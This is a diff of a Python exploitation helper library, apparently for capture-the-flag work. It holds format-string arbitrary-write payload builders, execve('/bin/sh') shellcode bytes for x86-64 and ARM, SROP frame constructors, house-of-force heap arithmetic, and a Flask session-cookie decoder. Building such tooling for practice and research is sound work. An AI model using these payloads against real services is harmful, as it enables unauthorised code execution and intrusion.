@@ -2,86 +2,110 @@ import struct
 import socket
 import telnetlib
 import re
+import base64
+import binascii
+import urllib
+import zlib
+from flask import json
+from itsdangerous import base64_decode, base64_encode
+from inspect import getsource
+from IPython import get_ipython
+
+ipython = get_ipython()
+ppploc = __file__
+
 
 #pack
-def pack32(data,fmt="<I"):
-    return struct.pack(fmt,data)
+def pack32(data, fmt="<I"):
+    return struct.pack(fmt, data)
 
-def unpack32(data,fmt="<I"):
-    return struct.unpack(fmt,data)[0]
 
-def pack(data,fmt="<Q"):
-    return struct.pack(fmt,data)
+def unpack32(data, fmt="<I"):
+    return struct.unpack(fmt, data)[0]
 
-def unpack(data,fmt="<Q"):
-    return struct.unpack(fmt,data)[0]
+
+def pack(data, fmt="<Q"):
+    return struct.pack(fmt, data)
+
+
+def unpack(data, fmt="<Q"):
+    return struct.unpack(fmt, data)[0]
+
 
 #Connection
-def make_conn(host,port):
-    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    sock.connect((host,port))
+def make_conn(host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
     return sock
 
-def recvuntil(sock,delim = '\n') :
+
+def recvuntil(sock, delim='\n'):
     data = ""
     while not data.endswith(delim):
         data += sock.recv(1)
     return data
 
-def sendline(sock,data):
+
+def sendline(sock, data):
     sock.send(data + '\n')
     return 1
+
 
 def inter(sock):
     t = telnetlib.Telnet()
     t.sock = sock
     t.interact()
 
+
 #fmt
-def fmtchar(prev_word,word,index,byte = 1):
+def fmtchar(prev_word, word, index, byte=1):
     fmt = ""
-    if word - prev_word > 0 :
+    if word - prev_word > 0:
         result = word - prev_word
         fmt += "%" + str(result) + "c"
-    elif word == prev_word :
+    elif word == prev_word:
         result = 0
-    else :
+    else:
         result = 256**byte - prev_word + word
         fmt += "%" + str(result) + "c"
-    if byte == 2 :
+    if byte == 2:
         fmt += "%" + str(index) + "$hn"
-    elif byte == 4 :
+    elif byte == 4:
         fmt += "%" + str(index) + "$n"
-    else :
+    else:
         fmt += "%" + str(index) + "$hhn"
     return fmt
+
 
 #chain : ptr->addr->val
 #use ptr to modify addr
 #then use addr to modify val
-def fmtchain(sock,ptrindex,addrindex,addr,val,recpat,byte = 1):
-    for i in range(4/byte):
-        recvuntil(sock,recpat)
+def fmtchain(sock, ptrindex, addrindex, addr, val, recpat, byte=1):
+    for i in range(4 / byte):
+        recvuntil(sock, recpat)
         prev = 0
         payload = ""
-        word =  (val >> i*byte*8 ) & (0x100**byte-1)
-        payload += fmtchar(prev, word ,addrindex,byte)
+        word = (val >> i * byte * 8) & (0x100**byte - 1)
+        payload += fmtchar(prev, word, addrindex, byte)
         prev = word
-        if i < 4/byte-1 :
-            word = (addr+byte) & (0x100**byte-1)
-            payload += fmtchar(prev,  word ,ptrindex,byte)
+        if i < 4 / byte - 1:
+            word = (addr + byte) & (0x100**byte - 1)
+            payload += fmtchar(prev, word, ptrindex, byte)
             prev = word
             addr += byte
-        sendline(sock,payload)
+        sendline(sock, payload)
 
-def xorstr(a,b):
-    return ''.join(chr(ord(x)^ord(y)) for x,y in zip(a,b))
 
-def search(data,pat):
-    match = re.search(pat,data)
-    assert(match)
+def xorstr(a, b):
+    return ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(a, b))
+
+
+def search(data, pat):
+    match = re.search(pat, data)
+    assert (match)
     result = match.group()
     return result
+
 
 def sc(arch="x86"):
     if arch == "x86":
@@ -90,16 +114,19 @@ def sc(arch="x86"):
         return "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
     elif arch == "arm":
         return "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
-    else :
+    else:
         return None
 
-def ror(x,n,bit = 32):
+
+def ror(x, n, bit=32):
     result = x >> n
-    result = result | (( x << (bit -n)) & (2**bit-1))
+    result = result | ((x << (bit - n)) & (2**bit - 1))
     return result
 
-def rol(x,n,bit = 32):
-    return ror(x,bit-n,bit)
+
+def rol(x, n, bit=32):
+    return ror(x, bit - n, bit)
+
 
 #srop x86_64
 #sigret
@@ -108,13 +135,14 @@ def rol(x,n,bit = 32):
 #rip
 #    syscall
 
-def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0):
-    uc_flags,uc_link,ss_sp,ss_flags,ss_size = [0,0,0,0,0]
-    r8,r9,r10,r11,r12,r13,r14,r15 = [0,0,0,0,0,0,0,0]
+
+def srop(sigret, rip, rbp, rsp, rdi=0, rsi=0, rax=0x3b, rbx=0, rcx=0, rdx=0):
+    uc_flags, uc_link, ss_sp, ss_flags, ss_size = [0, 0, 0, 0, 0]
+    r8, r9, r10, r11, r12, r13, r14, r15 = [0, 0, 0, 0, 0, 0, 0, 0]
     eflags = 0x246
-    cs,fs,gs,pad = [0x33,0,0,0]
-    selector = cs + (fs << 8*2) + (gs << 8*4) + (pad << 8*6)
-    [err,trapno,oldmask,cr2,fpstate] = [0,0,0,0,0]
+    cs, fs, gs, pad = [0x33, 0, 0, 0]
+    selector = cs + (fs << 8 * 2) + (gs << 8 * 4) + (pad << 8 * 6)
+    [err, trapno, oldmask, cr2, fpstate] = [0, 0, 0, 0, 0]
     ucontext = ""
     ucontext += pack(sigret)
     ucontext += pack(uc_flags)
@@ -147,6 +175,7 @@ def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0)
     ucontext += pack(cr2)
     return ucontext
 
+
 #srop 32
 #sigret
 #    mov eax,0x77
@@ -154,14 +183,17 @@ def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0)
 # eip
 #    int 0x80
 
-def srop32(sigret,eip,ebp,esp,ebx = 0,ecx = 0,edx = 0,eax = 0xb,edi = 0,esi = 0):
+
+def srop32(sigret, eip, ebp, esp, ebx=0, ecx=0, edx=0, eax=0xb, edi=0, esi=0):
     gs = 0x33
     cs = 0x73
     ss = 0x7b
     ds = 0x7b
     es = 0x7b
     fs = 0x0
-    trapno,err,eflags,sigesp,fpstate,oldmask,cr2 = [1,0,286,esp,0,0,0]
+    trapno, err, eflags, sigesp, fpstate, oldmask, cr2 = [
+        1, 0, 286, esp, 0, 0, 0
+    ]
     sigcontext = ""
     sigcontext += pack32(sigret)
     sigcontext += pack32(gs)
@@ -188,19 +220,14 @@ def srop32(sigret,eip,ebp,esp,ebx = 0,ecx = 0,edx = 0,eax = 0xb,edi = 0,esi = 0)
     sigcontext += pack32(cr2)
     return sigcontext
 
-def calc_force(targetaddr,topaddr,bits=64):
+
+def calc_force(targetaddr, topaddr, bits=64):
     if bits == 32:
         nb = targetaddr - 4 - topaddr - 0x8
-    else :
+    else:
         nb = targetaddr - 8 - topaddr - 0x10
     return nb
 
-import base64
-import binascii
-import urllib
-import zlib
-from flask import json
-from itsdangerous import base64_decode, base64_encode
 
 b64d = base64.b64decode
 b64e = base64.b64encode
@@ -211,6 +238,7 @@ hx = lambda x: binascii.hexlify(x)
 unhx = lambda x: binascii.unhexlify(x)
 true = True
 false = False
+
 
 def flask_decode(cookie):
     compressed = False
@@ -225,3 +253,5 @@ def flask_decode(cookie):
     return data
 
 
+def savef(func):
+    ipython.magic('%save -a {} getsource({})'.format(__file__, func))
